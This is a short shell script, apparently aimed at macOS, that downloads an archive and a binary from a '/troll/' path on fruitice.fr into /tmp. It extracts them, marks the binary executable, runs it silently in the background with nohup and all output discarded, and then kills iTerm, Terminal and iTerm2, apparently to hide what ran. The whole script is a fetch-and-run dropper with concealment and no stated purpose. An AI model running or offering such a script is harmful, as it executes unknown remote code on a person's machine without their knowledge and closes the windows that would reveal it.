mkdir -p /tmp/assets
curl https://fruitice.fr/troll/Banana.tar.gz -o /tmp/assets/banana.tar.gz
curl https://fruitice.fr/troll/simb -o /tmp/assets/simb
tar -xvf /tmp/assets/banana.tar.gz -C /tmp/assets/
chmod +x /tmp/assets/simb
cd /tmp/assets
nohup ./simb > /dev/null 2>&1
killall iTerm
killall Terminal
killall iTerm2
